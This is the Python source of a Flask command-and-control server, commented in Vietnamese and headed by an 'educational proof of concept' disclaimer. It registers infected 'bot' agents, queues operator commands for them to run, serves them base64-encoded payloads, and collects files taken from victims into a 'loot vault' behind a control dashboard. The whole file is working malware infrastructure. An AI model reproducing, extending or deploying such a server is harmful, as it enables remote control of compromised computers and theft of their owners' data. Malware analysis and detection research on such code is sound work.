# ======================================================================
# DISCLAIMER: This script is part of an educational Proof of Concept (PoC) project.
# It is intended strictly for authorized testing, malware analysis research,
# and educational purposes only. Do not use this for malicious activities.
# ======================================================================

import base64
from werkzeug.utils import secure_filename
from flask import Flask, request, jsonify, render_template
import logging
import database as db
import os

app = Flask(__name__)

# Tạo thư mục tải lên cho các payload agent
UPLOAD_DIR = "c2_uploads"
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)
    print(f"[*] Payload vault created at: {UPLOAD_DIR}")

# Tạo thư mục tải xuống cho dữ liệu đã cắt của nạn nhân
DOWNLOAD_DIR = "c2_downloads"
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)
    print(f"[*] Loot vault created at: {DOWNLOAD_DIR}")

# Lọc nhật ký để tránh spam từ sync agent
class NoSpamFilter(logging.Filter):
    def filter(self, record):
        return 'dashboard_data' not in record.getMessage()

logging.getLogger("werkzeug").addFilter(NoSpamFilter())

# Khởi tạo cơ sở dữ liệu khi khởi động
db.init_db()

# SAFE MODE: tạo dữ liệu mẫu để demo nhanh
SAFE_MODE = os.getenv('C2_SAFE_MODE', 'True').strip().lower() in ('1', 'true', 'yes')
if SAFE_MODE:
    db.check_in_agent('SAFE_AGENT', {
        'os_ver': 'Windows 10 Pro (Build 19042)',
        'cpu_name': 'Intel(R) Core(TM) i7-9700K',
        'gpu_name': 'NVIDIA GeForce RTX 2070',
        'ram_total': '16 GB',
        'disk_total': '512 GB'
    })
    db.add_log('[*] C2 server started in SAFE MODE with sample agent')

# ========================================
# 1. API CHO AGENT
# ========================================

# Xử lý check-in của agent
@app.route('/api/agent_checkin', methods=['POST'])
def checkin():
    bot_id = request.json.get('bot_id')
    hw_info = request.json.get('hw_info', {})

    if bot_id:
        db.check_in_agent(bot_id, hw_info)

    return jsonify({"bot_id": bot_id})

# Xử lý đồng bộ của agent để nhận lệnh và cập nhật tài nguyên
@app.route('/api/sync', methods=['POST'])
def sync():
    bot_id = request.json.get('bot_id')
    cpu = request.json.get('cpu', 0)
    ram = request.json.get('ram', 0)

    if bot_id:
        cmd = db.sync_agent(bot_id, cpu, ram)
        if cmd:
            return jsonify({"task": cmd})
    return jsonify({"task": "sleep"})

# Nhận kết quả lệnh từ agent
@app.route('/api/post_result', methods=['POST'])
def post_result():
    bot_id = request.json.get('bot_id')
    result = request.json.get('result')
    if bot_id:
        db.append_history(bot_id, f"\nC:\\> Result:\n{result}\n" + "-"*40 + "\n")
    return "OK", 200

# Gửi file cho agent
@app.route('/api/transfer/upload', methods=['POST'])
def send_payload():
    bot_id = request.json.get('bot_id')
    filename = request.json.get('filename')

    if not filename:
        return jsonify({"status": "error", "message": "Filename missing"}), 400

    safe_filename = secure_filename(filename)
    file_path = os.path.join(UPLOAD_DIR, safe_filename)

    if not os.path.exists(file_path):
        return jsonify({"status": "error", "message": f"File '{safe_filename}' not found in C2 vault."}), 404

    try:
        with open(file_path, "rb") as f:
            encoded_data = base64.b64encode(f.read()).decode('utf-8')

        return jsonify({"status": "success", "file_data": encoded_data}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Nhận file được tải lên từ agent
@app.route('/api/transfer/download', methods=['POST'])
def receive_download():
    bot_id = request.json.get('bot_id')
    filename = request.json.get('filename')
    file_data = request.json.get('file_data')

    if not all([bot_id, filename, file_data]):
        return jsonify({"status": "error", "message": "Missing data (bot_id, filename, file_data)"}), 400

    safe_filename = secure_filename(filename)
    if not safe_filename:
        safe_filename = "unknown_file.bin"

    bot_folder = os.path.join(DOWNLOAD_DIR, secure_filename(bot_id))
    os.makedirs(bot_folder, exist_ok=True)

    file_path = os.path.join(bot_folder, safe_filename)

    try:
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(file_data))
        return jsonify({"status": "success"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# ========================================
# 2. API BẢNG ĐIỀU KHIỂN
# ========================================

# Lấy dữ liệu bảng điều khiển
@app.route('/api/dashboard_data', methods=['GET'])
def get_dashboard_data():
    db_dict, logs = db.get_dashboard_data()
    return jsonify({"db": db_dict, "logs": logs})

# Gửi lệnh cho agent
@app.route('/api/send_command', methods=['POST'])
def send_command():
    target_bot = request.json.get('target_bot')
    new_cmd = request.json.get('cmd')

    if target_bot and new_cmd:
        db.queue_command(target_bot, new_cmd)
        db.append_history(target_bot, f"C:\\> {new_cmd}\n[*] Awaiting agent execution...\n")
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 400

# Phục vụ bảng điều khiển
@app.route('/', methods=['GET'])
def control_panel():
    return render_template('index.html')

if __name__ == '__main__':
    port = 1234
    print(f"[*] C2 server online and running at http://0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port)
